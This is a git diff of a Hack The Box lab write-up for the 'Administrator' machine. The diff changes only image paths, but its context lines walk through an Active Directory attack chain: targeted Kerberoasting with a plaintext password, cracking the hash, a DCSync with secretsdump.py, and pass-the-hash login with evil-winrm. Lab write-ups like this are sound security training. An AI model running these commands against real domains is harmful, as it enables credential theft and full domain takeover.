@@ -90,7 +90,7 @@ I quickly see which one is the path to follow:
 
 On bloodhound we see that emily has GenericWrite on Ethan:
 
-<figure><img src="../../../.gitbook/assets/image (5) (1) (2) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (5) (1) (2) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 I start iff looking at some attack vectors:
 
@@ -100,7 +100,7 @@ I try GetUserSpns but it does not work, then i find a tool from shutdown that tr
 
 {% embed url="https://github.com/ShutdownRepo/targetedKerberoast/blob/main/targetedKerberoast.py" %}
 
-<figure><img src="../../../.gitbook/assets/image (6) (1) (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (6) (1) (2) (1).png" alt=""><figcaption></figcaption></figure>
 
 i had the following problem: \[!] Kerberos SessionError: KRB\_AP\_ERR\_SKEW(Clock skew too great) that happens when the time difference between your **attacking machine** and the **Domain Controller (DC)** is too large (usually more than 5 minutes). so i had to sync my time with DC:
 
@@ -111,17 +111,17 @@ python targetedKerberoast.py -u "emily" -p "UXLCI5iETUsIBoFVTj8yQFKoHjXmb" -d "a
 
 Then i put my hash in a file and crack it with john and end up with `limpbizkit`
 
-<figure><img src="../../../.gitbook/assets/image (7) (1) (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (7) (1) (2) (1).png" alt=""><figcaption></figcaption></figure>
 
 We are at the last step of this box i thing and we have DCsync rights on Administrator.htb so let's have fun:
 
 {% embed url="https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync#dcsync" %}
 
-<figure><img src="../../../.gitbook/assets/image (8) (1) (2).png" alt=""><figcaption><p>secretsdump.py -outputfile 'dcsync.txt' administrator.htb/ethan:limpbizkit@10.129.107.16</p></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (8) (1) (2) (1).png" alt=""><figcaption><p>secretsdump.py -outputfile 'dcsync.txt' administrator.htb/ethan:limpbizkit@10.129.107.16</p></figcaption></figure>
 
 I can now do passthehash to get a session:
 
-<figure><img src="../../../.gitbook/assets/image (9) (1) (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (9) (1) (2) (1).png" alt=""><figcaption></figcaption></figure>
 
 ```
 evil-winrm -i 10.129.107.16 -u administrator -H 3dc553ce4b9fd20bd016e098d2d2fd2e
